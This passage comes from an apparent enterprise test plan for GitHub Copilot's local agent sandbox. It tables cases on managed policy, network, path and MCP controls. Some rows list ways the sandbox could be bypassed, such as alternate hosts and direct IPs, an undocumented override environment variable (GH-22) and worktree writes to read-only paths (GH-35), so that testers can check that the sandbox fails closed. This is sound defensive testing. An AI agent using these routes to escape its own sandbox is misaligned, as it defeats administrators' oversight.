> **Enterprise example:** in Ring 1 the payments squad runs `npm ci` against Artifactory (FS-13, CR-07) and the data-platform squad runs a local Python MCP server (MC-01, MC-03). Both must pass before Intune assigns the Ring 2 group.

## 11. Additional cases from VS Code test plans and GitHub issues

These 34 cases come from Microsoft's own **VS Code QA test plans** (`testplan-item` issues) and from **open or recent bug reports** in `github/copilot-cli`, `github/app` and `microsoft/vscode`. Where a bug report shows actual behaviour differs from the docs, the expected column states the **documented** outcome and the **known issue** next to it — record which one you see.

| ID | Use case (source) | How to test | Sandbox ON – CLI | Sandbox ON – Copilot app | Sandbox ON – VS Code | Sandbox OFF |
| --- | --- | --- | --- | --- | --- | --- |
| GH-01 | **Per-session opt-out with managed `allowBypass: true`** ([vscode#342468](https://github.com/microsoft/vscode/issues/342468)) | Managed `enabled: true, allowBypass: true`; turn sandbox off in session A only | ✅ `/sandbox disable` is session-only | ✅ Session-only | ✅ Toggle editable; session B and global setting **unchanged**; can turn back on | — |
| GH-02 | **Conflicting managed sources** (vscode#342468) | MDM `allowBypass: false` + server `allowBypass: true` | ⛔ `false` wins | ⛔ | ⛔ Toggle locked | — |
| GH-03 | **Permissive managed vs stricter user** ([vscode#339645](https://github.com/microsoft/vscode/issues/339645)) | Managed `allowOutbound: true` + user network off; repeat for local network, dev-tool access, MCP/LSP sandboxing, bypass | ⛔ Stricter user value wins for all 7 controls | ⛔ | ⛔ `/sandbox policy` shows the stricter value | — |
| GH-04 | **Managed `true` doesn't force a capability on** ([vscode#338294](https://github.com/microsoft/vscode/issues/338294)) | Managed `allowBypass: true`; user `allowUnsandboxedCommands: false` | ⛔ Bypass stays off | ⛔ | ⛔ Checkbox false and **editable** | — |
| GH-05 | **Old sessions after policy tightens** (vscode#338294) | Create sessions with toggle Off / On / default + one with "Allow in this Session"; then deliver strict policy and resume | ⛔ Saved Off **can't** bypass; prior session approval **revoked** | 🔍 | ⛔ Same; on policy removal, invalidated Off session is **not** silently restored | — |
| GH-06 | **Changing approval level** (vscode#338294) | Mid-session switch Manual → Allow all | ✅ Sandbox stays on | ✅ | ✅ | — |
| GH-07 | **Network block bypass attempts** ([vscode#336970](https://github.com/microsoft/vscode/issues/336970)) | Outbound off; try alternate hostnames, subdomains, direct IPs, HTTP redirects, non-443 ports | ⛔ All blocked | ⛔ | ⛔ Error names the sandbox restriction | ✅ |
| GH-08 | **Path edge cases** (vscode#336970) | Grant/deny invalid, missing, **relative**, and **space-containing** paths | ⚠️ Understandable error; nothing escapes policy. Missing denied path → directory created (FS-11) | 🔍 | ⚠️ Same | — |
| GH-09 | **Allowed child inside denied parent** (vscode#336970) | Deny `C:\SbxTest`, grant read on `C:\SbxTest\pub` | ✅ Child readable · ⛔ rest of parent (more specific wins) | 🔍 | ✅ / ⛔ | ✅ |
| GH-10 | **No credentials in output** ([vscode#339641](https://github.com/microsoft/vscode/issues/339641)) | Run authenticated `git` + `gh`; search transcript/logs for token strings | ✅ No secrets shown | ✅ | ✅ | ⚠️ Possible if a tool prints them |
| GH-11 | **Session close / restore** (vscode#339641) | Close and restore a sandboxed session; send follow-up | ✅ Still sandboxed | ✅ | ✅ Still sandboxed; policy report not auto-reopened | — |
| GH-12 | **Editor window vs Agents window** (vscode#339641, #339645) | Same policy; compare state, prompts, `/sandbox policy` in both | n/a | n/a | ✅ Identical state and wording; actions in one window don't affect sessions in the other | — |
| GH-13 | **Policy report freshness** ([vscode#336964](https://github.com/microsoft/vscode/issues/336964)) | Change one setting, new session, `/sandbox policy` | ✅ Shows new effective policy | n/a | ✅ No model turn; readable paths; no ANSI codes or broken Markdown | Reports "not active" |
| GH-14 | **Windows local-network notice** ([vscode#342467](https://github.com/microsoft/vscode/issues/342467)) | Sandbox on, `allowLocalNetwork` off, new chat | n/a | n/a | ⚠️ Notice "Sandboxing requires access to local network. Allow"; **Allow only opens Settings**; dismiss is per session | No notice |
| GH-15 | **CA lifecycle** ([vscode#342465](https://github.com/microsoft/vscode/issues/342465)) | **Sandbox: Manage Trusted CA** → Install, Rotate, Remove | ✅ `/sandbox ca create` / `trust` | 🔍 | ✅ Alert doesn't block chat; confirmation names target host; cert subject "CN=GitHub Copilot credential proxy" in LocalMachine Root. **Linux/WSL install not supported** | — |
| GH-16 | **Integrated Browser isolation** ([vscode#339644](https://github.com/microsoft/vscode/issues/339644)) | User opens a page; another session opens a page; current session lists pages | n/a | n/a | ✅ Session sees **only its own** pages; domain in allow + deny → **denied** | Browser unrestricted |
| GH-17 | **Dev Container sessions** ([vscode#340696](https://github.com/microsoft/vscode/issues/340696)) | Agents window → Use Dev Container → Sandboxing in Dev Container; `ls ~` on/off | 🔍 | n/a | ✅ Nested sandbox; sandboxed home listing **much shorter** | Full listing |
| GH-18 | **Corporate-hardened image** ([vscode#338112](https://github.com/microsoft/vscode/issues/338112)) | Standard corp build with **WDAC, AppLocker, Defender ASR**; run `node --version` | 🔍 Same engine — test | 🔍 | ⚠️ Known report: every command exits **0xC0000022** with no output | ✅ |
| GH-19 | **Repo on D:, Dev Drive (ReFS) or VHDX** ([cli#5207](https://github.com/github/copilot-cli/issues/5207), [cli#3712](https://github.com/github/copilot-cli/issues/3712)) | Open repo on non-C: drive / Dev Drive; `git status`, `dir` | ⚠️ Known: "Access is denied" / `backend_error`; shell starts in System32. Workaround: repo on **C: NTFS** | 🔍 | 🔍 Same engine | ✅ |
| GH-20 | **Shell starts in the workspace** ([vscode#313938](https://github.com/microsoft/vscode/issues/313938), [cli#4524](https://github.com/github/copilot-cli/issues/4524)) | `pwd` / `Get-Location`, then `git status` | ✅ Workspace root (regressions seen: `C:\`, temp dir) | ✅ | ✅ | ✅ |
| GH-21 | **Fresh login before policy resolves** ([cli#4522](https://github.com/github/copilot-cli/issues/4522)) | New profile, user `enabled: false`, no managed key; first `-p` command before token lookup | ⚠️ Provisional fail-closed floor sandboxes the command; session must **recover** once policy resolves 🔍 | 🔍 | n/a | Should run unsandboxed |
| GH-22 | **Undocumented override env var** ([cli#4853](https://github.com/github/copilot-cli/issues/4853)) | Managed `enabled + failIfUnavailable`; launch with `COPILOT_CLI_SANDBOX_SUPPORT_OVERRIDE=unsupported` | ⛔ **Must still fail closed** — if it runs unsandboxed, raise P1 with GitHub and add EDR detection | 🔍 | 🔍 Agent Host bundles the CLI runtime | Runs |
| GH-23 | **Nested / outer sandbox** (cli#4853) | Run inside a container that denies `unshare`/`setns` | ⛔ Clear error (pre-1.0.87: silent hang) | n/a | 🔍 | ✅ |
| GH-24 | **Sandbox OFF really off** ([cli#4679](https://github.com/github/copilot-cli/issues/4679)) | No managed key, `enabled: false`; run any command | n/a | n/a | n/a | ✅ Runs directly — known bug: BaseContainer still initialised, WRITE\_DAC error |
| GH-25 | **Non-GitHub git remotes / other identity** ([cli#5102](https://github.com/github/copilot-cli/issues/5102)) | Repo with own `credential.helper` (Azure Repos, Bitbucket, fine-grained PAT) | ⛔ Known: sandbox injects empty helper override → "unable to get password" (≥ 1.0.92) | 🔍 | 🔍 | ✅ |
| GH-26 | **Kerberos / Negotiate proxy** ([cli#5142](https://github.com/github/copilot-cli/issues/5142)) | Remote HTTP MCP through corp proxy needing NTLM/Negotiate | ⚠️ Known: `proxy_auth_required` for MCP transport | 🔍 | 🔍 | Same issue (not sandbox-specific) |
| GH-27 | **PAC file with DIRECT hosts** ([vscode#337239](https://github.com/microsoft/vscode/issues/337239)) | OS proxy via PAC; internal MCP host mapped DIRECT | n/a | n/a | ⚠️ Known: Agent Host forces proxy → MCP times out. Workaround: set **`http.noProxy`** | Same |
| GH-28 | **App loopback with Local network ON** ([app#4278](https://github.com/github/app/issues/4278)) | Listener on host `127.0.0.1:port`; `Test-NetConnection` from sandbox | n/a | ⚠️ Docs: ✅ · Known Windows bug: **times out** (per-process AppContainer lacks loopback exemption) | n/a | ✅ |
| GH-29 | **Policy report vs real behaviour** ([cli#4854](https://github.com/github/copilot-cli/issues/4854)) | Toggle local network; compare `/sandbox policy` with an actual `curl localhost` | ⚠️ Known display bug — trust the **actual test**, not the report | n/a | 🔍 | — |
| GH-30 | **Host rules when outbound is off** ([cli#3861](https://github.com/github/copilot-cli/issues/3861)) | `allowOutbound: false` + `allowedHosts: [api.github.com]` | ⛔ Allowed hosts **don't** re-open access | ⛔ | ⛔ | ✅ |
| GH-31 | **npx-based MCP with private registry** ([vscode#342547](https://github.com/microsoft/vscode/issues/342547)) | Start an `npx` MCP that pulls from Artifactory | 🔍 | 🔍 | ⚠️ Known: npm **E401**, MCP never starts. Open PR proposes default `mcpServers: false` — keep **managed `sandboxMcpServers: true`** and grant cache/registry | ✅ |
| GH-32 | **Windows file-based managed settings** (vscode#338294, #339645) | Place `%ProgramFiles%\GitHubCopilot\managed-settings.json`; **full restart** | ✅ Values shown `(managed)` | ✅ | ✅ Policy Diagnostics shows file source | — |
| GH-33 | **Program-level probe, not just shell** ([C# Corner](https://www.c-sharpcorner.com/article/testing-github-copilot-sandbox-rules-before-using-them-in-a-project)) | Agent builds and runs a small C# app calling `File.ReadAllText` / `File.AppendAllText` outside and inside the repo | ⛔ outside · ✅ inside | ⛔ / ✅ | ⛔ / ✅ | ✅ / ✅ |
| GH-34 | **Network proof with cold cache + full test run** (C# Corner) | Clear NuGet/npm cache or use a new package version; then `dotnet build` **and** `dotnet test` | ✅ Restore hits network; tests pass (TestResults, temp writable) | ✅ | ✅ | ✅ |

**Added after second sweep (22 Oct 2026) — each verified against the linked issue or release notes:**

| ID | Use case (source) | How to test | Sandbox ON – CLI | Sandbox ON – Copilot app | Sandbox ON – VS Code | Sandbox OFF |
| --- | --- | --- | --- | --- | --- | --- |
| GH-35 | **Worktree sessions keep project read-only / denied paths** ([app#4581](https://github.com/github/app/issues/4581)) | App project: `tests\` read-only; run `Set-Content tests\Locked.txt changed` in a **Branch** session, then a **Worktree** session | ✅ Enforced when the worktree's absolute path is listed | ⛔ Both sessions blocked on fixed build · ⚠️ **≤ 1.1.27: worktree write succeeds** (rule bound to main checkout path). Fixed 21 Oct in dev code — confirm in a stable release | 🔍 Check Agent Host worktree sessions | ✅ |
| GH-36 | **Workspace on an NTFS mount point** ([vscode#343231](https://github.com/microsoft/vscode/issues/343231)) | Dev Drive mounted at a folder (e.g. `C:\Projects`, no drive letter); `npm run <script>`; then add the `\\?\Volume{GUID}\` path to read-only | 🔍 Same MXC engine — expect failure | 🔍 | ⚠️ Known (open, *important*): Node **EPERM** on `stat`; adding the GUID path breaks startup **0x8007000F**. Fix is upstream (mxc#1548). Dev Drive **with a drive letter** works | ✅ |
| GH-37 | **Existing Local chats under managed policy** ([VS Code 1.142 release notes](https://code.visualstudio.com/updates/v1_142)) | Create a Local chat; deliver managed `sandbox.enabled: true`; reopen the chat | n/a | n/a | ✅ Chat auto-moves to Copilot harness; original archived only after the new chat opens; nothing sent automatically. Claude, Codex and terminal chat unavailable | Local chat continues |
| GH-38 | **Version gate only when sandbox is actually on** ([vscode#341561](https://github.com/microsoft/vscode/issues/341561)) | Below-minimum client; deliver `sandbox` object with `enabled: false` / omitted; then flip to `true` and back | 🔍 | 🔍 | ✅ Expected: blocked **only** when effective `enabled` is `true`; flipping back clears the block. Fix landed **server-side** (settings engine); VS Code issue still open — verify | Works |
| GH-39 | **Bypass after an in-sandbox error** ([vscode#337310](https://github.com/microsoft/vscode/issues/337310)) | `allowUnsandboxedCommands: true`; trigger a command that fails from a sandbox error, not a policy denial | 🔍 | 🔍 | ⚠️ Known: run-outside confirmation may **not** be offered; also non-deterministic (model may not request it) | — |
| GH-40 | **Per-server MCP sandbox in `mcp.json`** ([vscode#297115](https://github.com/microsoft/vscode/issues/297115)) | WSL/Linux only: several stdio servers, some with `"sandboxEnabled": true`, at user and workspace scope; check Process Explorer | n/a | n/a | ✅ Only opted-in servers sandboxed; their tool calls need no approval; error link shows missing grants. **Not available on Windows** (separate from Agent Host sandbox) | Unsandboxed |

**Reviewed and not added** (kept for audit):

- **cli#5206 (resumed-session approvals)** — real bug, but the reporter had the sandbox **disabled**; not a sandbox test.
- **cli#5193** — feature request (MCP reading effective policy), nothing to test yet.
- **vscode#337535** — feature request for guided prerequisite install; NG-05 already covers missing dependencies.
- **vscode#290620 / #322403** — the **legacy Local-harness** terminal sandbox (macOS/Linux, old `chat.tools.terminal.sandbox.*` keys); the forced-first-sandbox change was reverted.
- **Claimed maintainer workaround on vscode#338112** (grant `C:\` read) — **no such comment exists**; the only workaround there is the reporter turning the sandbox off.
- **Claim that Claude/Codex stay available when effective `enabled` is false** — not in vscode#341561; VS Code docs (21 Oct) say any managed settings disable them, so NG-09 stands.
- **"Developer: Restart Local Agent Host" after policy sync** — not in the cited issue; try it if Policy Diagnostics updates but sessions don't.

## Sources

All opened on 22 Oct 2026. 🔍 cases mark where these pages don't state the outcome or disagree — record the real result and update the table.

- [Using local sandboxing (GitHub Docs)](https://docs.github.com/en/copilot/how-tos/cloud-and-local-sandboxes/using-local-sandboxing)
- [Configuring local sandbox settings (GitHub Docs)](https://docs.github.com/en/copilot/how-tos/cloud-and-local-sandboxes/configuring-local-sandbox-settings)
- [Understanding local sandboxing in Copilot CLI (GitHub Docs)](https://docs.github.com/en/copilot/concepts/agents/copilot-cli/understanding-local-sandboxing)
- [About cloud and local sandboxes (GitHub Docs)](https://docs.github.com/en/copilot/concepts/security-governance-and-network-settings/about-cloud-and-local-sandboxes)
- [Enterprise managed settings reference (GitHub Docs)](https://docs.github.com/en/copilot/reference/enterprise-administrators/enterprise-managed-settings)
- [Hooks reference — sandboxed sessions (GitHub Docs)](https://docs.github.com/en/copilot/reference/hooks-reference)
- [Sandbox Copilot agent sessions (VS Code Docs)](https://code.visualstudio.com/docs/agents/run/agent-sandboxing)
- [Manage AI settings in enterprise environments (VS Code Docs)](https://code.visualstudio.com/docs/enterprise/manage-ai-settings)
- [copilot-cli issue #5089 — ACP mode ignores sandbox](https://github.com/github/copilot-cli/issues/5089)
- Copilot Sandboxing Rollout Runbook (project doc, 14 Oct 2026) — ring structure, profiles and smoke tests

VS Code QA test plans and GitHub issues (opened 22 Oct 2026; bug states may change):

- [vscode#342468 — per-session sandbox with managed allowBypass](https://github.com/microsoft/vscode/issues/342468) · [#336964 — effective policy report](https://github.com/microsoft/vscode/issues/336964) · [#336970 — Agents and editor windows](https://github.com/microsoft/vscode/issues/336970) · [#339641 — Agent Host sandboxing](https://github.com/microsoft/vscode/issues/339641)
- [vscode#338294 — managed sandbox policies](https://github.com/microsoft/vscode/issues/338294) · [#339645 — managed settings resolution](https://github.com/microsoft/vscode/issues/339645) · [#339644 — Integrated Browser restrictions](https://github.com/microsoft/vscode/issues/339644) · [#342465 — trusted CA](https://github.com/microsoft/vscode/issues/342465) · [#342467 — Windows local-network notice](https://github.com/microsoft/vscode/issues/342467) · [#340696 — Dev Container sessions](https://github.com/microsoft/vscode/issues/340696) · [#319218 — reads outside workspace](https://github.com/microsoft/vscode/issues/319218)
- Bugs: [vscode#338112](https://github.com/microsoft/vscode/issues/338112) · [vscode#342547](https://github.com/microsoft/vscode/issues/342547) · [vscode#313938](https://github.com/microsoft/vscode/issues/313938) · [vscode#337239](https://github.com/microsoft/vscode/issues/337239) · [cfgaudit#751](https://github.com/cfgaudit/cfgaudit/issues/751)
- Bugs: [cli#5207](https://github.com/github/copilot-cli/issues/5207) · [cli#3712](https://github.com/github/copilot-cli/issues/3712) · [cli#4524](https://github.com/github/copilot-cli/issues/4524) · [cli#4522](https://github.com/github/copilot-cli/issues/4522) · [cli#4679](https://github.com/github/copilot-cli/issues/4679) · [cli#4853](https://github.com/github/copilot-cli/issues/4853) · [cli#5102](https://github.com/github/copilot-cli/issues/5102) · [cli#5142](https://github.com/github/copilot-cli/issues/5142) · [cli#4854](https://github.com/github/copilot-cli/issues/4854) · [cli#3861](https://github.com/github/copilot-cli/issues/3861) · [app#4278](https://github.com/github/app/issues/4278)
- [C# Corner — Testing GitHub Copilot sandbox rules before using them in a project (24 Sep 2026)](https://www.c-sharpcorner.com/article/testing-github-copilot-sandbox-rules-before-using-them-in-a-project)

Second sweep (22 Oct 2026): [app#4581](https://github.com/github/app/issues/4581) · [vscode#343231](https://github.com/microsoft/vscode/issues/343231) · [vscode#341561](https://github.com/microsoft/vscode/issues/341561) · [vscode#337310](https://github.com/microsoft/vscode/issues/337310) · [vscode#297115](https://github.com/microsoft/vscode/issues/297115) · [vscode#338932](https://github.com/microsoft/vscode/issues/338932) · [vscode#341937](https://github.com/microsoft/vscode/issues/341937) · [VS Code 1.142 release notes](https://code.visualstudio.com/updates/v1_142)
